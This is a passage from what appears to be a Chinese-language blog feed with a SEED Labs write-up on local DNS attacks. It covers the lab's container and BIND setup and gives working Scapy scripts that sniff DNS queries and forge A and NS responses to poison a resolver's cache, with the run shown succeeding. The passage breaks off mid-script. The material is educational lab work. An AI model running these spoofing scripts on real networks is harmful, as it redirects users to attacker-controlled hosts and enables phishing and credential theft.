aria-hidden="true">image-20231129110258933</figcaption></figure></li><li><p>攻击成功原因：通过触发本地DNS服务器对一个example.com的随机子域名发起DNS请求，然后攻击者针对此域名查询发送DNS响应包，如果命中真实ID的伪造响应包在真实数据包前先到达，则成功实现DNS缓存投毒攻击。</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>SEED-LABS</category>
      
      <category>Network Security</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Local DNS Attack</title>
    <link href="/2023/11/29/SEED-LABS/Network%20Security/Local%20DNS%20Attack/"/>
    <url>/2023/11/29/SEED-LABS/Network%20Security/Local%20DNS%20Attack/</url>
    
    <content type="html"><![CDATA[<h1 id="lab-overview">1. Lab Overview</h1><p>DNS（域名系统）是互联网的电话簿；它将主机名转换为 IP地址（反之亦然）。这种转换是通过在幕后进行的 DNS 解析完成的。DNS攻击以各种方式操纵这一解析过程，目的是将用户误导到其他目的地，而这些目的地往往是恶意的。本实验室的目的是了解此类攻击的原理。首先，学生将设置和配置DNS 服务器，然后对实验室环境中的目标尝试各种 DNS 攻击。</p><p>攻击本地受害者和远程 DNS服务器的难度截然不同。因此，我们开发了两个实验室，一个侧重于本地 DNS攻击，另一个侧重于远程 DNS攻击。本实验室侧重于本地攻击。本实验室涵盖以下主题：</p><ul><li>DNS 及其工作原理</li><li>DNS 服务器设置</li><li>DNS 缓存中毒攻击</li><li>欺骗 DNS 响应</li><li>数据包嗅探和欺骗</li><li>Scapy 工具</li></ul><h1 id="lab-environment-setup-task">2. Lab Environment Setup Task</h1><p>DNS 缓存中毒攻击的主要目标是本地 DNS服务器。攻击真实服务器显然是非法的，因此我们需要建立自己的 DNS服务器来进行攻击实验。实验环境需要四台独立的机器：一台用于受害者，一台用于本地DNS 服务器，两台用于攻击者。实验环境设置如下图所示。本实验室的重点是本地攻击，因此我们将所有这些机器放在同一个局域网中。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291048539.png"alt="image-20231129101303765" /><figcaption aria-hidden="true">image-20231129101303765</figcaption></figure><h2 id="container-setup-and-commands">2.1 Container Setup andCommands</h2><p><code>dcbuild</code>；<code>dcup</code></p><h2 id="关于攻击者容器">2.2 关于攻击者容器</h2><p>在本实验室中，我们可以使用虚拟机或攻击者容器作为攻击者机器。如果查看Docker Compose 文件，你会发现攻击者容器的配置与其他容器不同。</p><ol type="1"><li>共享文件夹。当我们使用攻击者容器发动攻击时，需要将攻击代码放在攻击者容器内。在虚拟机中编辑代码比在容器中更方便，因为我们可以使用自己喜欢的编辑器。为了让虚拟机和容器共享文件，我们使用Docker 卷在虚拟机和容器之间创建了一个共享文件夹。如果查看 Docker Compose文件，你会发现我们在某些容器中添加了以下条目。它表示将主机（即虚拟机）上的./volumes 文件夹挂载到容器内的 /volumes 文件夹。我们将在 ./volumes文件夹（虚拟机上）中编写代码，以便在容器内使用它们。</li><li>主机模式。在本实验室中，攻击者需要能够嗅探数据包，但在容器内运行嗅探程序会有问题，因为容器实际上是连接到虚拟交换机上的，所以它只能看到自己的流量，而永远看不到其他容器中的数据包。为了解决这个问题，我们为攻击者容器使用主机模式。这样，攻击者容器就能看到所有流量。当容器处于主机模式时，它可以看到主机的所有网络接口，甚至拥有与主机相同的IP地址。不过，容器仍是一台独立的机器，因为它的其他命名空间仍与主机不同。</li></ol><h2 id="dns-配置概要">2.3 DNS 配置概要</h2><ul><li><p>本地 DNS 服务器。我们在本地 DNS 服务器上运行 BIND 9 DNS服务器程序。BIND 9 从名为 /etc/bind/named.conf的文件中获取配置。该文件是主要配置文件，通常包含多个 "include"条目，即实际配置存储在这些包含的文件中。其中一个包含文件名为/etc/bind/named.conf.options。实际配置就是在这里设置的。</p><ul><li><p>简化。现在，DNS 服务器会在 DNS查询中随机分配源端口号；这大大增加了攻击的难度。遗憾的是，许多 DNS服务器仍然使用可预测的源端口号。为了简化本实验室，我们在配置文件中将源端口号固定为33333。</p></li><li><p>关闭 DNSSEC。DNSSEC 的引入是为了防止对 DNS服务器的欺骗攻击。为了展示在没有这种保护机制的情况下攻击是如何工作的，我们在配置文件中关闭了这种保护机制。</p></li><li><p>DNS 缓存。在攻击过程中，我们需要检查本地 DNS 服务器上的 DNS缓存。以下两条命令与 DNS 缓存有关。第一条命令会将缓存内容转储到/var/cache/bind/dump.db 文件，第二条命令会清除缓存。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ rndc dumpdb -cache // Dump the cache to the specified file<br>$ rndc flush // Flush the DNS cache<br></code></pre></td></tr></table></figure></li><li><p>转发 attacker32.com 区域。在本地 DNS服务器中添加一个转发区，因此如果有人查询 attacker32.com域名，查询将被转发到该域名的名称服务器，而该名称服务器托管在 attacker容器中。该区域条目放在 named.conf 文件中。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf">zone <span class="hljs-string">&quot;attacker32.com&quot;</span> &#123;<br>type forward<span class="hljs-comment">;</span><br>forwarders &#123;<br><span class="hljs-number">10.9</span>.<span class="hljs-number">0.153</span><span class="hljs-comment">;</span><br>&#125;<span class="hljs-comment">;</span><br>&#125;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>用户机器。用户容器 10.9.0.5 已配置为使用 10.9.0.53 作为本地 DNS服务器。这是通过更改用户机器的解析器配置文件（/etc/resolv.conf）来实现的，因此服务器10.9.0.53 被添加为文件中的第一个 nameserver 条目，即该服务器将被用作主DNS 服务器。</p></li><li><p>攻击者的名称服务器。在攻击者的名称服务器上，我们托管了两个区域。一个是攻击者的合法区域attacker32.com，另一个是伪造的 example.com 区域。这些区域在/etc/bind/named.conf 中配置：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs abnf">zone <span class="hljs-string">&quot;attacker32.com&quot;</span> &#123;<br>type master<span class="hljs-comment">;</span><br>file <span class="hljs-string">&quot;/etc/bind/attacker32.com.zone&quot;</span><span class="hljs-comment">;</span><br>&#125;<span class="hljs-comment">;</span><br>zone <span class="hljs-string">&quot;example.com&quot;</span> &#123;<br>type master<span class="hljs-comment">;</span><br>file <span class="hljs-string">&quot;/etc/bind/example.com.zone&quot;</span><span class="hljs-comment">;</span><br>&#125;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="测试-dns-设置">2.4 测试 DNS 设置</h2><ol type="1"><li><p>获取 ns.attacker32.com 的 IP 地址。当我们运行下面的 dig命令时，由于本地 DNS 服务器配置文件中添加了转发区域条目，本地 DNS服务器会将请求转发到攻击者名称服务器。因此，答案应来自我们在 Attacker名称服务器上设置的区域文件(attacker32.com.zone)。如果不是这样，说明你的设置有问题。请在实验报告中描述您的观察结果。结果：user容器内进行查询，查询响应IP为10.9.0.153，即攻击者名称服务器。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291048540.png"alt="image-20231129102043132" /><figcaption aria-hidden="true">image-20231129102043132</figcaption></figure></li><li><p>获取www.example.com 的 IP 地址。现在有两个名称服务器托管example.com域名，一个是域名的官方名称服务器，另一个是攻击者容器。我们将查询这两个名称服务器，看看会得到什么回应。请（在用户计算机上）运行以下两条命令，并描述您的观察结果。结果：第一条命令会直接发请求给本地DNS服务器，接着本地DNS服务器将请求发给对应的官方的nameserver；第二条命令会直接发请求给攻击者DNS服务器。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291048541.png"alt="image-20231129102141751" /><figcaption aria-hidden="true">image-20231129102141751</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291048542.png"alt="image-20231129102150211" /><figcaption aria-hidden="true">image-20231129102150211</figcaption></figure><p>显然，没有人会向 ns.attacker32.com 询问 www.example.com 的 IP地址；他们总是会向 example.com 域名的官方名称服务器询问答案。DNS缓存中毒攻击的目的就是让受害者向 ns.attacker32.com 询问 www.example.com的 IP 地址。也就是说，如果我们的攻击成功，只要运行第一条 dig命令，即不带 @选项的命令，我们就会从攻击者那里得到虚假的结果，而不是从域名的合法名称服务器那里得到真实的结果。</p></li></ol><h1 id="the-attack-tasks">3. The Attack Tasks</h1><p>对用户进行 DNS 攻击的主要目的是，当用户试图使用 A 主机名访问 A主机时，将用户重定向到另一台机器B。例如，当用户试图访问网上银行时，如果对手能将用户重定向到一个看起来非常像银行主网站的恶意网站，用户就可能上当受骗，并泄露其网上银行账户密码。</p><h2 id="task-1-directly-spoofing-response-to-user">3.1 Task 1: DirectlySpoofing Response to User</h2><p>当用户在网络浏览器中输入网站名称（主机名，如www.example.com）时，用户的计算机会向本地 DNS 服务器发送 DNS请求，以解析主机名的 IP 地址。攻击者可以嗅探 DNS请求信息，然后立即创建一个虚假的 DNS响应，并发送回用户计算机。如果假回复早于真回复到达，用户机器就会接受它。见下图。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291048543.png"alt="image-20231129102310657" /><figcaption aria-hidden="true">image-20231129102310657</figcaption></figure><p>请编写一个发动这种攻击的程序。下面提供了一个代码骨架。第 4节提供了一个示例，说明如何创建包含各类记录的 DNS 数据包。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291048544.png"alt="image-20231129102332818" /><figcaption aria-hidden="true">image-20231129102332818</figcaption></figure><p>需要注意的是，在上述代码中，iface 参数的值（高亮显示）应替换为<strong>10.9.0.0/24</strong> 网络的实际接口名称。</p><p>当攻击程序运行时，您可以在用户机器上代表用户运行 dig命令。该命令会触发用户计算机向本地 DNS 服务器发送 DNS 查询，最终会向example.com 域名的权威名称服务器发送 DNS查询（如果缓存中没有答案）。如果攻击成功，您应该可以在回复中看到您的欺骗信息。比较攻击前后的结果。</p><p>发起攻击前，请确保本地 DNS 服务器的缓存已清除。如果缓存中有答案，本地DNS 服务器的回复将比您欺骗的回复更快，您的攻击将无法成功。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>编写代码：对向local-dns-server发起DNS查询的数据包进行欺骗。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">spoof_dns</span>(<span class="hljs-params">pkt</span>):<br>    <span class="hljs-comment"># 检查数据包中是否包含DNS层，以及查询域名是否为 &#x27;example.com&#x27;</span><br>    <span class="hljs-keyword">if</span> (DNS <span class="hljs-keyword">in</span> pkt <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;example.com&#x27;</span> <span class="hljs-keyword">in</span> pkt[DNS].qd.qname.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)):<br>        <span class="hljs-comment"># 打印DNS查询信息</span><br>        <span class="hljs-built_in">print</span>(pkt.sprintf(<span class="hljs-string">&quot;&#123;DNS: %IP.src% --&gt; %IP.dst%: %DNS.id%&#125;&quot;</span>))<br><br>        <span class="hljs-comment"># 构造IP、UDP和DNS层</span><br>        ip  = IP  (dst = pkt[IP].src, src = pkt[IP].dst)<br>        udp = UDP (dport = pkt[UDP].sport, sport = <span class="hljs-number">53</span>)<br><br>        <span class="hljs-comment"># 构造ANSWER SECTION</span><br>        Anssec = DNSRR( rrname = pkt[DNS].qd.qname, <br>                        <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;A&#x27;</span>, <br>                        rdata  = <span class="hljs-string">&#x27;1.2.3.4&#x27;</span>,<br>                        ttl    = <span class="hljs-number">259200</span>)<br><br>        <span class="hljs-comment"># 构造DNS响应数据包</span><br>        dns = DNS( <span class="hljs-built_in">id</span> = pkt[DNS].<span class="hljs-built_in">id</span>, qd = pkt[DNS].qd, aa=<span class="hljs-number">1</span>, rd=<span class="hljs-number">0</span>, qr=<span class="hljs-number">1</span>,           <br>                   qdcount=<span class="hljs-number">1</span>, ancount=<span class="hljs-number">1</span>, an = Anssec)<br><br>        <span class="hljs-comment"># 构造伪造的数据包</span><br>        spoofpkt = ip/udp/dns<br><br>        <span class="hljs-comment"># 发送伪造的DNS响应</span><br>        send(spoofpkt)<br><br><span class="hljs-comment"># 设置过滤条件，监听是否有主机向local-dns-server发起DNS请求</span><br>myFilter = <span class="hljs-string">&#x27;udp and (dst host 10.9.0.53 and dst port 53)&#x27;</span><br><br><span class="hljs-comment"># 使用Scapy的sniff函数捕获符合过滤条件的数据包，并调用spoof_dns函数进行处理</span><br>pkt=sniff(iface=<span class="hljs-string">&#x27;br-117c9837158d&#x27;</span>, <span class="hljs-built_in">filter</span>=myFilter, prn=spoof_dns)<br></code></pre></td></tr></table></figure></li><li><p>未启动攻击，用户进行DNS查询，返回正确结果。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291048545.png"alt="image-20231129102613309" /><figcaption aria-hidden="true">image-20231129102613309</figcaption></figure></li><li><p>清除本地DNS服务器中的缓存，发起攻击，用户进行DNS查询，返回伪造的响应，攻击成功。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291048546.png"alt="image-20231129102626062" /><figcaption aria-hidden="true">image-20231129102626062</figcaption></figure></li></ol><h2 id="task-2-dns-cache-poisoning-attack-spoofing-answers">3.2 Task 2:DNS Cache Poisoning Attack – Spoofing Answers</h2><p>上述攻击以用户机器为目标。为了达到持久效果，用户机器每次发送www.example.com 的 DNS 查询时，攻击者的机器都必须发送欺骗的 DNS响应。这样做的效率可能不高；还有一种更好的攻击方式，即以 DNS服务器而不是用户机器为目标。</p><p>当本地 DNS服务器收到查询时，它首先会从自己的缓存中查找答案；如果答案在缓存中，DNS服务器将直接从缓存中回复信息。如果缓存中没有答案，DNS 服务器将尝试从其他DNS服务器获取答案。得到答案后，它会将答案存储在缓存中，这样下次就不需要再询问其他DNS 服务器了。</p><p>因此，如果攻击者能欺骗其他 DNS 服务器的响应，本地 DNS服务器就会在其缓存中保留欺骗的响应一段时间。下一次，当用户的机器要解析同一主机名时，就会从缓存中获取欺骗的响应。这样，攻击者只需欺骗一次，其影响将持续到缓存信息过期为止。这种攻击被称为DNS 缓存中毒。</p><p>请修改上一个任务中使用的程序，以便进行此次攻击。攻击前，请确保 DNS服务器的缓存为空。</p><p>您可以检查本地 DNS服务器上的缓存，查看它是否中毒。以下命令首先将缓存转储到文件中，然后显示缓存文件的内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ rndc dumpdb -cache<br>$ <span class="hljs-built_in">cat</span> /var/cache/bind/dump.db<br></code></pre></td></tr></table></figure><p><strong>实验流程：</strong></p><ol type="1"><li><p>编写代码：对本地DNS服务器发出的DNS查询进行欺骗。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">spoof_dns</span>(<span class="hljs-params">pkt</span>):<br>    <span class="hljs-comment"># 检查数据包中是否包含DNS层，以及查询域名是否为 &#x27;example.com&#x27;</span><br>    <span class="hljs-keyword">if</span> (DNS <span class="hljs-keyword">in</span> pkt <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;example.com&#x27;</span> <span class="hljs-keyword">in</span> pkt[DNS].qd.qname.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)):<br>        <span class="hljs-comment"># 打印DNS查询信息</span><br>        <span class="hljs-built_in">print</span>(pkt.sprintf(<span class="hljs-string">&quot;&#123;DNS: %IP.src% --&gt; %IP.dst%: %DNS.id%&#125;&quot;</span>))<br><br>        <span class="hljs-comment"># 构造IP、UDP和DNS层</span><br>        ip  = IP  (dst = pkt[IP].src, src = pkt[IP].dst)<br>        udp = UDP (dport = pkt[UDP].sport, sport = <span class="hljs-number">53</span>)<br><br>        <span class="hljs-comment"># 构造ANSWER SECTION</span><br>        Anssec = DNSRR( rrname = pkt[DNS].qd.qname, <br>                        <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;A&#x27;</span>, <br>                        rdata  = <span class="hljs-string">&#x27;1.2.3.4&#x27;</span>,<br>                        ttl    = <span class="hljs-number">259200</span>)<br><br>        <span class="hljs-comment"># 构造DNS响应数据包</span><br>        dns = DNS( <span class="hljs-built_in">id</span> = pkt[DNS].<span class="hljs-built_in">id</span>, qd = pkt[DNS].qd, aa=<span class="hljs-number">1</span>, rd=<span class="hljs-number">0</span>, qr=<span class="hljs-number">1</span>,           <br>                   qdcount=<span class="hljs-number">1</span>, ancount=<span class="hljs-number">1</span>, an = Anssec)<br><br>        <span class="hljs-comment"># 构造伪造的数据包</span><br>        spoofpkt = ip/udp/dns<br><br>        <span class="hljs-comment"># 发送伪造的DNS响应</span><br>        send(spoofpkt)<br><br><span class="hljs-comment"># 设置过滤条件，监听local-dns-server向上级DNS服务器发起的请求包</span><br>myFilter = <span class="hljs-string">&#x27;udp and (src host 10.9.0.53 and dst port 53)&#x27;</span><br><br><span class="hljs-comment"># 使用Scapy的sniff函数捕获符合过滤条件的数据包，并调用spoof_dns函数进行处理</span><br>pkt=sniff(iface=<span class="hljs-string">&#x27;br-117c9837158d&#x27;</span>, <span class="hljs-built_in">filter</span>=myFilter, prn=spoof_dns)<br></code></pre></td></tr></table></figure></li><li><p>未启动攻击，用户进行DNS查询，返回正确结果。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291048547.png"alt="image-20231129102922098" /><figcaption aria-hidden="true">image-20231129102922098</figcaption></figure></li><li><p>清除本地DNS服务器缓存，启动攻击，用户进行DNS查询，返回伪造的响应，攻击成功。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291048548.png"alt="image-20231129102936988" /><figcaption aria-hidden="true">image-20231129102936988</figcaption></figure></li><li><p>停止攻击，用户再次进行DNS查询，还是返回了伪造的IP地址，说明本地DNS服务器已经被污染。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291048550.png"alt="image-20231129103003592" /><figcaption aria-hidden="true">image-20231129103003592</figcaption></figure></li><li><p>导出缓存，查看缓存内容，可以看到目标域名对应的虚假IP1.2.3.4已经存储到缓存文件。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291048551.png"alt="image-20231129103020149" /><figcaption aria-hidden="true">image-20231129103020149</figcaption></figure></li></ol><h2 id="task-3-spoofing-ns-records">3.3 Task 3: Spoofing NS Records</h2><p>在前面的任务中，我们的 DNS 缓存中毒攻击只影响一个主机名，即www.example.com。如果用户试图获取另一个主机名（如 mail.example.com）的IP 地址，我们就需要再次发起攻击。如果我们发起的攻击能影响整个example.com 域，则效率会更高。</p><p>我们的想法是在 DNS 回复中使用 "授权"部分。基本上，我们在欺骗应答时，除了欺骗应答（在 "应答"部分）外，还会在 "授权 "部分添加以下内容。当本地 DNS服务器缓存此条目时，ns.attacker32.com 将被用作今后查询 example.com域中任何主机名的名称服务器。由于 ns.attacker32.com由攻击者控制，它可以为任何查询提供伪造的答案。在我们的设置中，这台机器的IP 地址是 10.9.0.153。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291048552.png"alt="image-20231129103122027" /><figcaption aria-hidden="true">image-20231129103122027</figcaption></figure><p>请在攻击代码中添加一条欺骗的 NS 记录，然后发起攻击。第 4节提供了一个示例，说明如何在 DNS 响应数据包中加入 NS 记录。SEED书中提供了详细的指南。攻击前，请记住先清除本地 DNS服务器的缓存。如果攻击成功，当您在用户计算机上对 example.com域中的任何主机名运行 dig 命令时，您将获得由 ns.attacker32.com 提供的假IP 地址。还请检查本地 DNS 服务器的缓存，查看缓存中是否有欺骗的 NS记录。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>编写代码：在task2基础上，仅需添加一条NS记录，同时修改DNS响应数据包。当本地DNS服务器发起DNS请求时，进行伪装应答，同时返回虚假的权威服务器ns.attacker32.com。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">spoof_dns</span>(<span class="hljs-params">pkt</span>):<br>    <span class="hljs-comment"># 检查数据包中是否包含DNS层，以及查询域名是否为 &#x27;example.com&#x27;</span><br>    <span class="hljs-keyword">if</span> DNS <span class="hljs-keyword">in</span> pkt <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;example.com&#x27;</span> <span class="hljs-keyword">in</span> pkt[DNS].qd.qname.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>):<br>        <span class="hljs-comment"># 打印DNS查询信息</span><br>        <span class="hljs-built_in">print</span>(pkt.sprintf(<span class="hljs-string">&quot;&#123;DNS: %IP.src% --&gt; %IP.dst%: %DNS.id%&#125;&quot;</span>))<br><br>        <span class="hljs-comment"># 构造IP、UDP和DNS层</span><br>        ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)<br>        udp = UDP(dport=pkt[UDP].sport, sport=<span class="hljs-number">53</span>)<br><br>        <span class="hljs-comment"># 构造ANSWER SECTION</span><br>        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;A&#x27;</span>, rdata=<span class="hljs-string">&#x27;1.2.3.4&#x27;</span>, ttl=<span class="hljs-number">259200</span>)<br><br>        <span class="hljs-comment"># 构造nameserver服务器相关信息</span><br>        NSsec = DNSRR(rrname=<span class="hljs-string">&#x27;example.com&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;NS&#x27;</span>, rdata=<span class="hljs-string">&#x27;ns.attacker32.com&#x27;</span>, ttl=<span class="hljs-number">259200</span>)<br><br>        <span class="hljs-comment"># 构造DNS响应数据包</span><br>        dns = DNS(<span class="hljs-built_in">id</span>=pkt[DNS].<span class="hljs-built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="hljs-number">1</span>, rd=<span class="hljs-number">0</span>, qr=<span class="hljs-number">1</span>, qdcount=<span class="hljs-number">1</span>, ancount=<span class="hljs-number">1</span>, an=Anssec, nscount=<span class="hljs-number">1</span>, ns=NSsec)<br><br>        <span class="hljs-comment"># 构造伪造的数据包</span><br>        spoofpkt = ip/udp/dns<br><br>        <span class="hljs-comment"># 发送伪造的DNS响应</span><br>        send(spoofpkt)<br><br><span class="hljs-comment"># 设置过滤条件，监听local-dns-server向上级DNS服务器发起的请求包</span><br>myFilter = <span class="hljs-string">&#x27;udp and (src host 10.9.0.53 and dst port 53)&#x27;</span><br><br><span class="hljs-comment"># 使用Scapy的sniff函数捕获符合过滤条件的数据包，并调用spoof_dns函数进行处理</span><br>pkt = sniff(iface=<span class="hljs-string">&#x27;br-117c9837158d&#x27;</span>, <span class="hljs-built_in">filter</span>=myFilter, prn=spoof_dns)<br></code></pre></td></tr></table></figure></li><li><p>未启动攻击，用户进行DNS查询，返回正确结果。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291048553.png"alt="image-20231129103300480" /><figcaption aria-hidden="true">image-20231129103300480</figcaption></figure></li><li><p>清除本地DNS服务器缓存，发起攻击，用户进行DNS查询，返回的IP地址是攻击服务器中的结果。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291048554.png"alt="image-20231129103325277" /><figcaption aria-hidden="true">image-20231129103325277</figcaption></figure></li><li><p>攻击DNS服务器上查看域名example.com的处理机制，刚才查询的是www.example.com，正确返回1.2.3.5。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291048555.png"alt="image-20231129103451490" /><figcaption aria-hidden="true">image-20231129103451490</figcaption></figure></li><li><p>查看本地DNS服务器缓存，存在伪造的NS记录。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291048556.png"alt="image-20231129103520924" /><figcaption aria-hidden="true">image-20231129103520924</figcaption></figure></li></ol><h2 id="task-4-spoofing-ns-records-for-another-domain">3.4 Task 4:Spoofing NS Records for Another Domain</h2><p>在之前的攻击中，我们成功毒化了本地 DNS 服务器的缓存，因此ns.attacker32.com 成为 example.com域名的名称服务器。受这一成功的启发，我们希望将其影响扩展到其他域。也就是说，在由www.example.com 查询触发的欺骗响应中，我们希望在 Authority部分添加额外条目（见下文），这样 ns.attacker32.com 也会被用作 google.com的名称服务器。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291048557.png"alt="image-20231129104005940" /><figcaption aria-hidden="true">image-20231129104005940</figcaption></figure><p>请略微修改攻击代码，在本地 DNS 服务器上发起上述攻击。攻击结束后，检查DNS缓存，看看哪条记录被缓存。请描述并解释您的观察结果。需要注意的是，我们攻击的查询仍然是对example.com 的查询，而不是对 google.com 的查询。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>编写代码：在task3基础上，额外增加一条NS记录，同时修改DNS响应数据包即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">spoof_dns</span>(<span class="hljs-params">pkt</span>):<br>    <span class="hljs-comment"># 检查数据包中是否包含DNS层，以及查询域名是否为 &#x27;example.com&#x27;</span><br>    <span class="hljs-keyword">if</span> DNS <span class="hljs-keyword">in</span> pkt <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;example.com&#x27;</span> <span 